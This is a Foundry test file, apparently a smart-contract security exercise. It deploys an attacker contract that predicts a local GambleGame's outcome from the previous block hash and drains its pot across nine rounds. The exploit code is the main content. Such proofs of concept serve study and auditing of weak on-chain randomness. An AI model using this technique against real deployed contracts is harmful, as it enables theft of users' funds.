// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.23;

import {GambleGame} from "../src/GambleGame.sol";
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/Console.sol";

contract AttackGambleGame {
    GambleGame gg;
    constructor(GambleGame _gg) payable {
        gg = _gg;
    }

    function attack() public payable {
        uint256 value = uint256(blockhash(block.number - 1));
        uint256 random = value % 2;
        bool _guess = random == 1 ? true : false;
        gg.play{value: 1 ether}(_guess);
    }

    receive() external payable {}
}

contract GambleGameTest is Test {
    GambleGame gg;
    function setUp() public {
        gg = new GambleGame{value: 1 ether}();
    }

    function test_attackGambleGameContract() public {
        // deploy AttackGambleGame
        AttackGambleGame attack = new AttackGambleGame{value: 9 ether}(gg);
        console.log(address(attack).balance);
        vm.roll(block.number + 1);

        // loop 9 times
        for(uint i=0; i<9; i++ ) {
            // call attack function
            attack.attack();

            // simulate roll block forward
            vm.roll(block.number + 1);
        }
        // check attacker balance is 9 eth + the initial pot
        console.log(address(attack).balance);
    }
}